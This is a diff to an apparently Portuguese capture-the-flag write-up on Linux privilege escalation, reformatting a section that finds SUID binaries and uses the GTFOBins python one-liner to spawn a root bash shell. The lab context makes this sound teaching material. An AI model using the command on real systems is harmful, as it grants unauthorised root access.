@@ -134,7 +134,8 @@ find / -perm -u=s -type f 2>/dev/null; find / -perm -4000 -o- -perm -2000 -o- -p
 Encontrado /usr/bin/python
 
 No [GTFObins]([https://](https://gtfobins.github.io/gtfobins/python/#suid)) como obter root através de SUID no python.  
-./usr/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
+`./usr/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-p")'`
 
-Ultima flag encontrada  
-![Alt text](/assets/img/rootme4.png){: .left}
+### **Última flag encontrada** 
+![Alt text](/assets/img/rootme4.png){: .w-75 .normal}
+    
